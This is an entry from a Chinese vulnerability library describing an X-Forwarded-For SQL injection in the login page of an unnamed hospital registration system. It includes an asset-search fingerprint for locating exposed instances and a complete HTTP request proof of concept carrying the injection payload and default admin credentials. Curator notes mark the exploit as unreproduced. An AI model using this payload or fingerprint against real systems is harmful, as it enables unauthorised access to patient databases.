---
source: "wy876 漏洞文库"
title: "挂号系统（发行方未知） login X-Forwarded-For插入型SQL注入"
product: "挂号系统（发行方未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL语法假设，版本未知"
prerequisites: "固定验证码/哈希和登录参数前提未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yfrf96eoc8tgqfau"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%8C%82%E5%8F%B7%E7%B3%BB%E7%BB%9F/%E6%8C%82%E5%8F%B7%E7%B3%BB%E7%BB%9Flogin.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-e3a39f00fcfea4e50e273e06"
entity_id: "ve-e3a39f00fcfea4e50e273e06"
schema_version: "1"
---

# 挂号系统（发行方未知） login X-Forwarded-For插入型SQL注入

## 条目说明

- 对象与具体问题：挂号系统（发行方未知）；login X-Forwarded-For插入型SQL注入
- 版本、配置及部署条件：MySQL语法假设，版本未知
- 认证与权限前提：固定验证码/哈希和登录参数前提未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 真实注入位置XFF日志/插入语句而非username，应在标题说明
- 正文已有insert型勿sqlmap警告须保留；写入日志/业务记录有状态风险
- exists(select * from mysql)的mysql表/库语义不清，无成功/错误响应不能认定注入
- 验证码与vcode_hash获取/绑定规则未给，产品泛名/修复缺失

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
挂号系统存在SQL注入，可能导致数据库信息泄露、恶意数据库操作

## 二、资产测绘
```plain
body="res/img/ht_box_back.gif" || body="/res/img/ht_box_top.gif" || body="/res/img/ht_box_bottom.gif" || body="dom_loaded.load(init);"
```


### 三、漏洞复现
```http
POST /m/login.php?op=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: application/x-www-form-urlencoded
x-forwarded-for: 127.0.0.1 'and exists(select * from mysql)-- 123

username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
```


**注入为insert类型，请勿使用sqlmap**


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yfrf96eoc8tgqfau>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
